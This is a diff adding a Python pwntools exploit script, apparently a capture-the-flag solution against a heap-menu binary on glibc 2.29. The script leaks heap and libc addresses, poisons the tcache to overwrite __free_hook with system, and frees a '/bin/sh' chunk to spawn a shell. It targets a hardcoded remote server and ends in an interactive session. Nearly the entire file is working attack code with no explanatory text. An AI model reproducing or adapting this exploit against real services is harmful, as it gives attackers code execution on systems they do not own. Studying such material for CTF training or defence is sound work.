@@ -1,0 +1,153 @@
+#!/usr/bin/env python3
+#-*- coding:utf-8 -*-
+# Author: i0gan
+# Env: Linux arch 5.8.14-arch1-1
+
+from pwn import *
+import os
+
+r   =  lambda x : io.recv(x)
+ra  =  lambda   : io.recvall()
+rl  =  lambda   : io.recvline(keepends = True)
+ru  =  lambda x : io.recvuntil(x, drop = True)
+s   =  lambda x : io.send(x)
+sl  =  lambda x : io.sendline(x)
+sa  =  lambda x, y : io.sendafter(x, y)
+sla =  lambda x, y : io.sendlineafter(x, y)
+ia  =  lambda : io.interactive()
+c   =  lambda : io.close()
+li  = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
+
+
+context.log_level='debug'
+context.terminal = ['tmux', 'splitw', '-h']
+
+elf_path  = 'pwn'
+MODIFY_LD = 0
+arch = '64'
+libc_v = '2.29'
+
+ld_path   = '/glibc/' + libc_v + '/' + arch + '/lib/ld-linux-x86-64.so.2'
+libs_path = '/glibc/' + libc_v + '/' + arch + '/lib'
+libc_path = '/glibc/' + libc_v + '/' + arch + '/lib/libc.so.6'
+libc_path = './libc.so.6'
+
+# change ld path 
+if(MODIFY_LD):
+	os.system('cp ' + elf_path + ' ' + elf_path + '.bk')
+	change_ld_cmd = 'patchelf  --set-interpreter ' + ld_path +' ' + elf_path
+	os.system(change_ld_cmd)
+	li('modify ld ok!')
+	exit(0)
+
+# remote server ip and port
+server_ip = "119.3.89.93"
+server_port = 8014
+
+# if local debug
+LOCAL = 0
+LIBC  = 1
+
+
+#--------------------------func-----------------------------
+def db():
+	if(LOCAL):
+		gdb.attach(io)
+
+def ad(i, sz, d):
+	sla('ce:', '1')
+	sla(':', str(i))
+	sla(':', str(sz))
+	sa(':', d)
+
+def md(i, sz, d):
+	sla('ce:', '2')
+	sla(':', str(i))
+	sla(':', str(sz))
+	if(len(d) > 0):
+		sa(':', d)
+	
+def rm(i):
+	sla('ce:', '3')
+	sla(':', str(i))
+
+def dp(i):
+	sla('ce:', '4')
+	sla(':', str(i))
+
+def cre7():
+	sla('ce:', '5')
+
+def gift(d):
+	sla('ce:', '666')
+	sla(':', d)
+
+#--------------------------exploit--------------------------
+def exploit():
+	li('exploit...')
+	for i in range(10):
+		ad(i, 0x18, 'A' * 0x18)
+
+	rm(1)
+	md(0, 0, '')
+	dp(0)
+
+	ru(':')
+	leak = u64(ru('\n')[-6:] + b'\x00\x00')
+	heap = leak - 0x2a0
+	li('heap: ' + hex(heap))
+
+	for i in range(5):
+		rm(i + 2)
+
+	md(7, 0, '')
+	md(7, 0x18, p64(heap + 0x250))
+	ad(0, 0x18, b'A')
+	ad(0, 0x18, b'A')
+	
+	gift('none')
+	ru('0x')
+	leak = int(r(12), 16)
+	offset = ( 0x7f50cd676140 - 0x7f50cd412000 ) # remote
+	#offset = ( 0x7f6faf78a900 - 0x7f6faf53a000) # local
+	libc_base = leak - offset
+	free_hook = libc_base + libc.sym['__free_hook']
+	system = libc_base + libc.sym['system']
+	li('libc_base: ' + hex(libc_base))
+
+	ad(0, 0x58, b'A')
+	ad(1, 0x58, b'/bin/sh\x00')
+	ad(2, 0x58, b'A')
+	md(0, 0, '')
+	md(0, 0x58, p64(free_hook))
+	gift('A')
+	gift(p64(system))
+	db()
+	rm(1)
+	#ad(5, 0x58, 'A')
+
+	
+
+def finish():
+	ia()
+	c()
+
+#--------------------------main-----------------------------
+if __name__ == '__main__':
+	
+	if LOCAL:
+		elf = ELF(elf_path)
+		if LIBC:
+			libc = ELF(libc_path)
+			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path, "LD_PRELOAD" : libc_path} )
+		else:
+			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path} )
+	
+	else:
+		elf = ELF(elf_path)
+		io = remote(server_ip, server_port)
+		if LIBC:
+			libc = ELF(libc_path)
+
+	exploit()
+	finish()
